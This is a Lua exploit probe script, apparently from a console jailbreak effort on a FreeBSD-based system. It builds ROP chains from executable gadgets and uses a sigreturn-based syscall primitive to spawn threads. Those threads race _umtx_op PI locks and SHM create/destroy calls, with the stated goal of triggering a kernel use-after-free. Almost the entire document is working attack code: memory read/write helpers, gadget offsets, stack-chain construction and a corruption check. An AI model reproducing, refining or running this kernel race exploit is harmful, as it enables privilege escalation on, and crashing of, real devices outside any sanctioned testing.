-- CRASH_CLASS: MODERATE
-- PROBE 142y: UMTX PI race with multiple threads
-- Create 6 threads all racing LOCK_PI/UNLOCK_PI on the same futex.
-- Also race SHM_CREAT/SHM_DESTROY. Goal: trigger kernel UAF.

print("=== PROBE 142y: UMTX PI RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local sc_thr_create = make_syscall(430)
local sc_nanosleep = make_syscall(240)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x400000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local brh, brl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", brh, brl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local einfo = memory.alloc(0x200)
wd(einfo, 0x160)
pcall(function() make_syscall(593)(uint64(0), uint64(einfo)) end)
local elo = safe_rd(einfo + 0x108) or 0
local ehi = safe_rd(einfo + 0x10C) or 0
local g_ret     = uint64(string.format("0x%X%08X", ehi, elo + 0x42))
local g_pop_rax = uint64(string.format("0x%X%08X", ehi, elo + 0x992))
local g_pop_rdi = uint64(string.format("0x%X%08X", ehi, elo + 0xC9DFE))
local g_pop_rsi = uint64(string.format("0x%X%08X", ehi, elo + 0xD77D))
local g_pop_rdx = uint64(string.format("0x%X%08X", ehi, elo + 0x420E6D))
local g_pop_rcx = uint64(string.format("0x%X%08X", ehi, elo + 0xE64))

print("eboot=" .. string.format("0x%X%08X", ehi, elo))

-- Create socketpair for IPC
local sp = gpu + 0x1000
wd(sp, 0xDEAD); wd(sp + 4, 0xDEAD)
srop(135, uint64(1), uint64(1), uint64(0), ua(sp))
local fd_a = safe_rd(sp) or 0
local fd_b = safe_rd(sp + 4) or 0
print("socketpair: " .. fd_a .. "," .. fd_b)

-- Futex for PI race
local futex = gpu + 0x2000
wd(futex, 0)  -- unlocked

-- Status markers for each thread
local markers = gpu + 0x3000

--------------------------------------------------------------------
-- [A] PI Race: 6 threads racing LOCK/UNLOCK on same futex
-- Each thread: nanosleep(delay) → LOCK_PI → write marker → UNLOCK_PI
-- → write done marker → thr_exit
--------------------------------------------------------------------
print("")
print("--- [A] PI Race setup ---")

local threads = {}
for t = 0, 5 do
    local rop_base = gpu + 0x40000 + t * 0x2000
    local stack_top = rop_base + 0x1000  -- ROP chain at upper half
    local marker_addr = markers + t * 8
    local delay_ns = 1000000 + t * 500000  -- 1ms to 3.5ms stagger

    -- Build ROP chain
    local ts_buf = rop_base + 0x100
    wq(ts_buf, uint64(0))
    wq(ts_buf + 8, uint64(delay_ns))

    local write_buf = rop_base + 0x200
    wd(write_buf, 0xBEEF0000 + t)  -- "I was here" marker

    local i = 0
    -- 1. nanosleep(stagger delay)
    wq(stack_top + i, g_pop_rdi); i=i+8
    wq(stack_top + i, ua(ts_buf)); i=i+8
    wq(stack_top + i, g_pop_rsi); i=i+8
    wq(stack_top + i, uint64(0)); i=i+8
    wq(stack_top + i, g_pop_rax); i=i+8
    wq(stack_top + i, uint64(240)); i=i+8  -- nanosleep
    wq(stack_top + i, sc_addr); i=i+8

    -- 2. LOCK_PI (umtx_op=454, op=13)
    wq(stack_top + i, g_pop_rdi); i=i+8
    wq(stack_top + i, ua(futex)); i=i+8
    wq(stack_top + i, g_pop_rsi); i=i+8
    wq(stack_top + i, uint64(13)); i=i+8  -- UMTX_OP_LOCK_PI
    wq(stack_top + i, g_pop_rdx); i=i+8
    wq(stack_top + i, uint64(0)); i=i+8
    wq(stack_top + i, g_pop_rax); i=i+8
    wq(stack_top + i, uint64(454)); i=i+8  -- _umtx_op
    wq(stack_top + i, sc_addr); i=i+8

    -- 3. write(fd_a, marker, 4) to report lock acquired
    wq(stack_top + i, g_pop_rdi); i=i+8
    wq(stack_top + i, uint64(fd_a)); i=i+8
    wq(stack_top + i, g_pop_rsi); i=i+8
    wq(stack_top + i, ua(write_buf)); i=i+8
    wq(stack_top + i, g_pop_rdx); i=i+8
    wq(stack_top + i, uint64(4)); i=i+8
    wq(stack_top + i, g_pop_rax); i=i+8
    wq(stack_top + i, uint64(4)); i=i+8  -- write
    wq(stack_top + i, sc_addr); i=i+8

    -- 4. UNLOCK_PI
    wq(stack_top + i, g_pop_rdi); i=i+8
    wq(stack_top + i, ua(futex)); i=i+8
    wq(stack_top + i, g_pop_rsi); i=i+8
    wq(stack_top + i, uint64(14)); i=i+8  -- UMTX_OP_UNLOCK_PI
    wq(stack_top + i, g_pop_rdx); i=i+8
    wq(stack_top + i, uint64(0)); i=i+8
    wq(stack_top + i, g_pop_rax); i=i+8
    wq(stack_top + i, uint64(454)); i=i+8
    wq(stack_top + i, sc_addr); i=i+8

    -- 5. thr_exit(0)
    wq(stack_top + i, g_pop_rdi); i=i+8
    wq(stack_top + i, uint64(0)); i=i+8
    wq(stack_top + i, g_pop_rax); i=i+8
    wq(stack_top + i, uint64(431)); i=i+8
    wq(stack_top + i, sc_addr); i=i+8

    -- Create thread context
    local tctx = rop_base + 0x800
    for off = 0, 0x4FF, 4 do wd(tctx + off, 0) end
    pcall(function() return sc_gc(uint64(tctx)) end)
    wq(tctx + 0xE0, g_ret)        -- RIP → ret gadget
    wq(tctx + 0xF8, ua(stack_top)) -- RSP → ROP chain

    local tid_buf = rop_base + 0x700
    wq(tid_buf, uint64(0))

    table.insert(threads, {ctx=tctx, tid_buf=tid_buf, t=t})
end

-- Launch all 6 threads rapidly
print("[A] launching 6 threads...")
for _, th in ipairs(threads) do
    pcall(function()
        return sc_thr_create(uint64(th.ctx), uint64(th.tid_buf), uint64(0))
    end)
    local tid_val = safe_rq(th.tid_buf)
    local _, tl = get_hi_lo(tid_val)
    print("[A] thread " .. th.t .. " tid=" .. tl)
end

-- Wait 2 seconds for all threads to complete
print("[A] waiting 2s...")
local ts2 = memory.alloc(16)
wq(ts2, uint64(2))
wq(ts2 + 8, uint64(0))
pcall(function() sc_nanosleep(uint64(ts2), uint64(0)) end)

-- Check futex state
local futex_val = safe_rd(futex)
print("[A] futex after race: 0x" .. string.format("%08X", futex_val or 0))

-- Read any messages from socket
local read_buf = gpu + 0x80000
for off = 0, 0xFF, 4 do wd(read_buf + off, 0) end
local rv_r = srop(3, uint64(fd_b), ua(read_buf), uint64(256))
local rh, rl = get_hi_lo(rv_r)
print("[A] socket read=" .. rl .. " bytes")

if rl > 0 and rl < 256 then
    for off = 0, rl - 1, 4 do
        local v = safe_rd(read_buf + off)
        if v then
            local thread_id = v - 0xBEEF0000
            if thread_id >= 0 and thread_id < 6 then
                print("[A] thread " .. thread_id .. " reported lock acquired")
            else
                print("[A] data: 0x" .. string.format("%08X", v))
            end
        end
    end
end

--------------------------------------------------------------------
-- [B] SHM race: threads racing SHM_CREAT/SHM_DESTROY
--------------------------------------------------------------------
print("")
print("--- [B] SHM Race ---")

local shm_key = gpu + 0x4000

-- Create socketpair for round 2
local sp2 = gpu + 0x4100
wd(sp2, 0xDEAD); wd(sp2 + 4, 0xDEAD)
srop(135, uint64(1), uint64(1), uint64(0), ua(sp2))
local fd_c = safe_rd(sp2) or 0
local fd_d = safe_rd(sp2 + 4) or 0

-- Build 4 threads: 2 create, 2 destroy, all on same key
local shm_threads = {}
for t = 0, 3 do
    local rop_base = gpu + 0xA0000 + t * 0x2000
    local stack_top = rop_base + 0x1000
    local key_buf = rop_base + 0x100
    wq(key_buf, uint64(0xDEAD0000 + t))  -- unique per thread but same key for race

    -- Actually use SAME key for all threads
    wq(key_buf, uint64(0x42424242))

    local write_buf = rop_base + 0x200
    local op = (t < 2) and 1 or 3  -- threads 0,1 = SHM_CREAT, threads 2,3 = SHM_DESTROY
    wd(write_buf, 0xCafe0000 + t)

    local delay_ns = 500000 + t * 200000  -- 0.5ms to 1.1ms stagger

    local ts_buf = rop_base + 0x300
    wq(ts_buf, uint64(0))
    wq(ts_buf + 8, uint64(delay_ns))

    local i = 0
    -- nanosleep stagger
    wq(stack_top + i, g_pop_rdi); i=i+8
    wq(stack_top + i, ua(ts_buf)); i=i+8
    wq(stack_top + i, g_pop_rsi); i=i+8
    wq(stack_top + i, uint64(0)); i=i+8
    wq(stack_top + i, g_pop_rax); i=i+8
    wq(stack_top + i, uint64(240)); i=i+8
    wq(stack_top + i, sc_addr); i=i+8

    -- umtx_op(key_buf, 25=SHM, op, 0, 0)
    wq(stack_top + i, g_pop_rdi); i=i+8
    wq(stack_top + i, ua(key_buf)); i=i+8
    wq(stack_top + i, g_pop_rsi); i=i+8
    wq(stack_top + i, uint64(25)); i=i+8  -- UMTX_OP_SHM
    wq(stack_top + i, g_pop_rdx); i=i+8
    wq(stack_top + i, uint64(op)); i=i+8  -- 1=CREAT or 3=DESTROY
    wq(stack_top + i, g_pop_rax); i=i+8
    wq(stack_top + i, uint64(454)); i=i+8
    wq(stack_top + i, sc_addr); i=i+8

    -- write result to socket
    wq(stack_top + i, g_pop_rdi); i=i+8
    wq(stack_top + i, uint64(fd_c)); i=i+8
    wq(stack_top + i, g_pop_rsi); i=i+8
    wq(stack_top + i, ua(write_buf)); i=i+8
    wq(stack_top + i, g_pop_rdx); i=i+8
    wq(stack_top + i, uint64(4)); i=i+8
    wq(stack_top + i, g_pop_rax); i=i+8
    wq(stack_top + i, uint64(4)); i=i+8
    wq(stack_top + i, sc_addr); i=i+8

    -- thr_exit
    wq(stack_top + i, g_pop_rdi); i=i+8
    wq(stack_top + i, uint64(0)); i=i+8
    wq(stack_top + i, g_pop_rax); i=i+8
    wq(stack_top + i, uint64(431)); i=i+8
    wq(stack_top + i, sc_addr); i=i+8

    local tctx = rop_base + 0x800
    for off = 0, 0x4FF, 4 do wd(tctx + off, 0) end
    pcall(function() return sc_gc(uint64(tctx)) end)
    wq(tctx + 0xE0, g_ret)
    wq(tctx + 0xF8, ua(stack_top))

    local tid_buf = rop_base + 0x700
    wq(tid_buf, uint64(0))
    table.insert(shm_threads, {ctx=tctx, tid_buf=tid_buf, t=t, op=op})
end

-- Launch SHM race threads
print("[B] launching 4 SHM threads...")
for _, th in ipairs(shm_threads) do
    pcall(function()
        return sc_thr_create(uint64(th.ctx), uint64(th.tid_buf), uint64(0))
    end)
    local tv = safe_rq(th.tid_buf)
    local _, tl = get_hi_lo(tv)
    local opname = th.op == 1 and "CREAT" or "DESTROY"
    print("[B] thread " .. th.t .. " tid=" .. tl .. " op=" .. opname)
end

-- Wait 2 seconds
pcall(function() sc_nanosleep(uint64(ts2), uint64(0)) end)

-- Read results
for off = 0, 0xFF, 4 do wd(read_buf + off, 0) end
rv_r = srop(3, uint64(fd_d), ua(read_buf), uint64(256))
rh, rl = get_hi_lo(rv_r)
print("[B] socket read=" .. rl .. " bytes")

if rl > 0 and rl < 256 then
    for off = 0, rl - 1, 4 do
        local v = safe_rd(read_buf + off)
        if v then
            print("[B] thread " .. ((v - 0xCafe0000) % 16) .. " completed")
        end
    end
end

--------------------------------------------------------------------
-- [C] Post-race: check for corruption
--------------------------------------------------------------------
print("")
print("--- [C] Corruption check ---")

-- Check if process VM is still healthy
print("[C] pid still=" .. to_num(sc20()))

-- Try making more syscalls
local rv_test = srop(3, uint64(fd_b), ua(read_buf), uint64(1))
print("[C] read test=" .. hex(rv_test))

-- Check kernel VM counter
local sc624 = make_syscall(624)
local _, v624 = pcall(function() return sc624() end)
print("[C] sys624=" .. hex(v624))

-- Final futex state
futex_val = safe_rd(futex)
print("[C] futex=0x" .. string.format("%08X", futex_val or 0))

print("")
print("=== DONE ===")
